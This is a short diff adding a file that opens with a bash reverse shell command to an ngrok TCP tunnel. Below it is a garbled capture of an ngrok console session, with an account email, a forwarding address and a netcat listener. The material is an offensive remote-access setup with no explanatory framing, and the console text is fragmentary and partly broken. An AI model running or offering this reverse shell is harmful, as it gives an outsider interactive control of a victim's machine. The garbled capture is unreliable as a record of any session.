@@ -1,0 +1,52 @@
+/bin/bash -i>&/dev/tcp/0.tcp.in.ngrok.io/11202 0>&1
+
+
+ngrok
+
+Session Status
+Account
+Update
+ystem
+Version
+Region
+Latency
+Web Interface
+Forwarding
+Home
+Connections
+
+(Ctrl+C to quit)
+
+Take our ngrok in production survey! https://forms.gle/aXiBFWzEA36DudF
+
+online
+tessterman@gmail.com (Plan: Free)
+update available (version 3.8.0, Ctrl-U
+3.3.1
+India (in)
+2ms
+http://127.0.0.1:4040
+tcp://0.tcp.in.ngrok.io:11202 -> localho
+
+ttl
+
+6
+
+opn
+1
+
+rt1
+0.01
+
+rt5
+0.01
+
+p50
+71.20
+
+
+--------------------------------------------------------------------------
+L# nc -nvlp 7717
+listening on [any] 7717
+
+..
